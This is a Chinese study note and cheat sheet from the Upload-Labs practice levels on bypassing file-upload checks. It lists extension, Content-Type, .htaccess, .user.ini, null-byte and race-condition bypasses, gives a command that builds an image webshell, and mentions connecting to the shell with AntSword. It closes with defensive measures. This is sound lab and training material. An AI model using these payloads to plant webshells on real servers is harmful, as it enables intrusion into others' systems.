# 学习笔记 · 文件上传绕过姿势汇总

> 来源：Upload-Labs 刷题整理 | 难度：⭐⭐ | 考点：`文件上传` `WAF/过滤绕过`

## 常见校验点与绕过对照

| 校验方式 | 绕过姿势 |
|---|---|
| 前端 JS 校验扩展名 | 禁用 JS / 直接抓包改包 |
| Content-Type 白名单 | 抓包改 `Content-Type: image/png` |
| 黑名单扩展名 | `php5/phtml/phps`；`shell.php.`（Windows 去尾点）；`shell.php::$DATA`；大小写 `PhP` |
| 文件头检测 | 图片马：`GIF89a` + php 代码，存 `shell.gif` |
| getimagesize | 图片马 / 二次渲染后仍保留数据的位置（GIF 注释块） |
| `.htaccess` 未禁 | 上传 `AddType application/x-httpd-php .jpg` |
| `.user.ini` 未禁 | `auto_prepend_file=shell.jpg`（需 CGI/FastCGI） |
| 00 截断（PHP<5.3.4） | `shell.php%00.jpg`（GET）/ POST 二进制 00 |
| 条件竞争 | 上传+访问竞速：脚本不停写包，另一脚本不停 GET |
| 逻辑缺陷 | 二次渲染找不变区域；路径拼接可 `../` 控制目录 |

## 图片马制作

```bash
cat normal.png shell.php > shell.png
# 或保留完整图片头
copy /b normal.png + shell.php shell.png     # Windows
```

## 验证环节

1. 回显的文件路径要能猜到（看响应、看目录规则）
2. 用 AntSword 连接，注意有的关卡需要自定义解析规则

## 总结

- 上传题的本质：**让服务器把它当代码执行，且你知道路径**
- 排查顺序：先看前端提示 → 黑名单还是白名单 → 是否检测内容 → 是否重命名/二次渲染
- 防守：白名单 + 随机文件名 + 存储与 Web 分离 + 不给上传目录执行权限
